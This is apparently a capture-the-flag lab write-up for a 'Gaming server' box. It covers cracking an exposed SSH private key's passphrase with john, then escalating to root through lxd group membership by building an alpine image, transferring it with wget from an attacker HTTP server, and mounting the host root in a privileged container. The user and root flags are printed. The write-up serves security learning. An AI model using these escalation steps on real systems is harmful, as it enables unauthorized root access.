### Gaming server ###

export IP=10.10.225.165

found /secret with a private ssh key...
and /uploads with a dict wordlist

cloned from git:ssh2john and converted the ssh file into id_rsa.hash
then john id_rsa.hash -wordlist=<Wordlist>(Which i found earlier)
Found the phrase:letmein

also in the source code found a user:john
sshed into the machine
# User.txt:
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e

#id:lxc
Upon further research, I found lxd is a linux container manager, and can be used to mount the root folder on the host machine. I found this article, which guides you through creating a container, and mounting to the root folder using lxd.

From that article I found the following method for creating an alpine linux container and mounting it into the root directory.

On your own machine run lxd-alpine-builder to make a small alpine linux container

    git clone https://github.com/saghul/lxd-alpine-builder.git

CD into the clone directory and run the build-alpine file, which will generate a tar.gz file that contains the alpine linux container.

The start a http server, and transfer the alpine linux container from your machine to the target machine

    python -m SimpleHTTPServer 5000 (your machine)

    wget yourip:5000/alpinecontainer.tar.gz

Now that we have the alpine linux container on the target, we need to import it into lxc

    lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage

Then we'll give the container privileges and add the root directory as a mount point, and start the container

    lxc init myimage ignite -c security.privileged=true

    lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true

    lxc start ignite

    lxc exec ignite /bin/sh

From here if we cd into /mnt/root we can get the root flag

# Root.txt:
2e337b8c9f3aff0c2b3e8d4e6a7c88fc

